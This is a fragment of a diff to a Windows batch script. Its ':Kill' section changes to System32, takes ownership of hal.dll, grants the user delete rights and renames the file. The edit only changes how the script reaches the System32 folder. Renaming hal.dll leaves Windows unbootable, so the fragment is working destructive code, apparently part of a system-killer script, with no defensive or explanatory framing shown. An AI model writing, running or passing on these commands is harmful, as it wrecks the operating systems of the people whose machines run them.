@@ -30,7 +30,8 @@ echo Invalid Syntax!
 goto :Warning
 
 :Kill
-cd "%windir%\System32"
+%SystemDrive%
+cd Windows\System32
 takeown /f hal.dll 
 icacls hal.dll /grant %USERNAME%:(d,wdac)
 ren hal.dll hal1.dll
